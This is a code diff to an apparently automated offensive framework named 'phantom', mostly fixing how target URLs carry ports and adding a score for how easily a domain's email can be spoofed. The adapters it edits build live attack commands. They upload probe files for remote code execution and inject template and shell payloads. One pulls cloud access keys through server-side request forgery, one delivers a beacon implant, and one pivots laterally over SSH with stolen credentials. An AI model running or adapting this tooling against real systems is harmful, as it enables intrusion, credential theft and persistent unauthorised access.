@@ -19,6 +19,7 @@ from phantom.automation.phone_intel import (
     phone_intel_engine, phone_intel_interp,
 )
 from phantom.automation.guidance.commands import Capability, InputSlot
+from phantom.automation.guidance.targets import split_host_port
 # P3: the generative fuzz engine (brain/fuzz) had no capability reaching it;
 # these are the adapter/interpreter/engine that register it below. Imported
 # at module level because the registry is a LITERAL (statements cannot live
@@ -601,6 +602,28 @@ def _bare_host(raw: str) -> str:
     return host
 
 
+def _hport(host: str, port) -> str:
+    """``host:port`` netloc with the port appearing exactly ONCE.
+
+    A service target (``127.0.0.1:8081``) already carries its port, and every
+    adapter that appends a discovered one produced ``http://127.0.0.1:8081:8081/
+    upload`` — a URL curl rejects, which the engine reports as "no output"
+    (i.e. the target looks unreachable while curl was never asked a valid
+    question). When the candidate port differs from the one in the target,
+    the CANDIDATE wins: it is the port a fact was recorded for.
+    """
+    raw = str(host or "").strip()
+    port = str(port or "").strip()
+    if not port:
+        return raw
+    bare, own = split_host_port(raw)
+    if own is None:
+        return f"{raw}:{port}"
+    if str(own) == port:
+        return raw
+    return f"{bare}:{port}"
+
+
 def _effective_target(wm: WorldModel) -> str:
     """The machine to aim network tooling at: ALWAYS a bare host.
 
@@ -1012,6 +1035,9 @@ _SOCIAL_MARKERS = {
     "email_masked": "EMAIL_MASKED:",
     "email_verified": "EMAIL_VERIFIED:",
     "service_account": "SERVICE_ACCOUNT:",
+    # deliverability of the target's OWN sending domain (surface pass):
+    # SPF/DMARC/MX answered live, scored by social/domain_readiness
+    "domain_readiness": "DOMAIN_READINESS:",
 }
 
 
@@ -1292,6 +1318,26 @@ def _social_interp(output: str, wm: WorldModel, slots: Dict[str, Any]) -> List[F
                        "platform": kv.get("platform", ""),
                        "url": kv.get("url", "")[:300]},
                 confidence=0.8, source="deep_recon", target=wm.target))
+        kv = _parse_marker_line(line, _SOCIAL_MARKERS["domain_readiness"])
+        if kv.get("domain"):
+            try:
+                score = float(kv.get("score", "0") or 0)
+            except (TypeError, ValueError):
+                score = 0.0
+            # A domain with no SPF/DKIM/DMARC is spoofable, which is a real
+            # attack path against the target's own customers and staff — the
+            # confidence IS the readiness score, so a hardened domain ranks
+            # last instead of looking like a hole.
+            findings.append(Finding(
+                kind="domain_readiness",
+                key=f"dns:{kv['domain']}",
+                value={"domain": kv.get("domain", ""),
+                       "score": score,
+                       "grade": kv.get("grade", ""),
+                       "ready": kv.get("ready", "0") == "1",
+                       "issues": kv.get("issues", "none")},
+                confidence=max(0.0, min(1.0, (100.0 - score) / 100.0)),
+                source="surface_map", target=wm.target))
         kv = _parse_marker_line(line, "SESSION_USED:")
         if not kv.get("platforms"):
             # same receipt from the local reader (no beacon involved)
@@ -1849,9 +1895,19 @@ def _curl_probe_adapter(wm, slots):
     gate see plain `curl` invocations. Bounded: 10 ports x 3s worst
     case, always under the capability timeout.
     """
-    host = _effective_target(wm)
+    # A service target (`host:port`) contributes its HOST to the URL and its
+    # port to the sweep: the operator named that service, so it is swept even
+    # when it is not in the shortlist (`8081`, `9443`, ...). The port is
+    # stripped HERE and not in `_bare_host`, because the web adapters depend
+    # on the target keeping its port (a stripped host sent the whole web
+    # phase at `http://127.0.0.1` while the app was on :8081 — every probe
+    # then returned "no output" and the app looked dead).
+    host = split_host_port(_effective_target(wm))[0]
+    own_port = split_host_port(_resolve_target_address(wm))[1]
     raw = str(slots.get("ports", "") or "")
     ports = []
+    if own_port:
+        ports.append(own_port)
     for chunk in raw.replace(",", " ").split():
         try:
             port = int(chunk)
@@ -2505,13 +2561,14 @@ def _web_rce_adapter(wm, slots):
     for p in _DEFAULT_UPLOAD_PATHS:
         if p not in paths:
             paths.append(p)
+    netloc = _hport(target, port)
     segments = []
     for p in paths[:6]:
         segments.append(
             f"curl -s -m 8 -F 'file=@{tmp};filename=probe.py' "
-            f"{scheme}://{target}:{port}{p} | grep -o '{marker}:[0-9]*'")
+            f"{scheme}://{netloc}{p} | grep -o '{marker}:[0-9]*'")
     probes = _join_local_shell(segments)
-    tried = " ".join(f"{scheme}://{target}:{port}{p}" for p in paths[:6])
+    tried = " ".join(f"{scheme}://{netloc}{p}" for p in paths[:6])
     return f"echo 'RCE_PROBE_PATHS: {tried}' ; {probes}"
 
 
@@ -2552,7 +2609,11 @@ def _lateral_adapter(wm, slots):
         raise ValueError("lateral pivot requires a peer host")
     user, pw = slots.get("username", ""), slots.get("password", "")
     payload = slots.get("payload") or _beacon_payload(wm)
-    return lateral_pivot_command(host, user, pw, payload)
+    # The remote SHELL differs by family on the same SSH transport: an
+    # unfingerprinted peer keeps the POSIX launcher (what this always did),
+    # a known Windows peer gets `start /b cmd /c` instead of `nohup &`.
+    return lateral_pivot_command(host, user, pw, payload,
+                                 os_name=slots.get("os", ""))
 
 
 def _smb_adapter(wm, slots):
@@ -3039,7 +3100,7 @@ def _rce_foothold_adapter(wm, slots):
             r"\{\{.*?\}\}|\$\{.*?\}|\#\{.*?\}|<%=.*?%>",
             urllib.parse.quote(payload, safe=""),
             cand.get("endpoint") or "/")
-        return (f"curl -m 10 -s 'http://{target}:{cand['port']}{endpoint}' "
+        return (f"curl -m 10 -s 'http://{_hport(target, cand['port'])}{endpoint}' "
                 f"| grep -o '{marker}' && echo RCE:channel=ssti "
                 f"marker={marker}")
     if cand["channel"] == "cmdi":
@@ -3052,7 +3113,7 @@ def _rce_foothold_adapter(wm, slots):
                                          f"echo {marker}")
         if endpoint is None:
             raise ValueError("cmdi endpoint has no injectable GET parameter")
-        return (f"curl -m 10 -s 'http://{target}:{cand['port']}{endpoint}' "
+        return (f"curl -m 10 -s 'http://{_hport(target, cand['port'])}{endpoint}' "
                 f"| grep -o '{marker}' && echo RCE:channel=cmdi "
                 f"marker={marker}")
     if cand["channel"] == "ssrf":
@@ -3062,7 +3123,7 @@ def _rce_foothold_adapter(wm, slots):
         endpoint = re.sub(
             r"https?://[^&'\"\\ ]+", payload,
             cand.get("endpoint") or "/?url=", count=1)
-        return (f"curl -m 10 -s 'http://{target}:{cand['port']}{endpoint}' "
+        return (f"curl -m 10 -s 'http://{_hport(target, cand['port'])}{endpoint}' "
                 f"| grep -Eo 'AccessKeyId|SecretAccessKey|Token' "
                 f"| head -1 && echo RCE:channel=ssrf marker={marker}")
     if cand["channel"] == "msf":
@@ -3175,7 +3236,7 @@ def _beacon_via_rce_adapter(wm, slots):
         target = _effective_target(wm)
         scheme = "https" if str(cand.get("port")) in ("443", "8443") else "http"
         return (f"curl -m 25 -s -F 'file=@{tmp};filename=probe.py' "
-                f"{scheme}://{target}:{cand['port']}/upload "
+                f"{scheme}://{_hport(target, cand['port'])}/upload "
                 ">/dev/null && echo PHANTOM_RCE_DELIVERED")
     if cand["channel"] == "ssti":
         import base64
@@ -3190,7 +3251,7 @@ def _beacon_via_rce_adapter(wm, slots):
             urllib.parse.quote(payload, safe=""),
             cand.get("endpoint") or "/")
         target = _effective_target(wm)
-        return (f"curl -m 25 -s 'http://{target}:{cand['port']}{endpoint}' "
+        return (f"curl -m 25 -s 'http://{_hport(target, cand['port'])}{endpoint}' "
                 "-o /dev/null && echo PHANTOM_RCE_DELIVERED")
     if cand["channel"] == "cmdi":
         # confirmed command injection = the SHORTEST path to the beacon:
@@ -3204,7 +3265,7 @@ def _beacon_via_rce_adapter(wm, slots):
         if endpoint is None:
             raise ValueError("cmdi endpoint has no injectable GET parameter")
         target = _effective_target(wm)
-        return (f"curl -m 25 -s 'http://{target}:{cand['port']}{endpoint}' "
+        return (f"curl -m 25 -s 'http://{_hport(target, cand['port'])}{endpoint}' "
                 "-o /dev/null && echo PHANTOM_RCE_DELIVERED")
     if cand["channel"] == "poc":
         # A local PoC already proved command execution against this exact
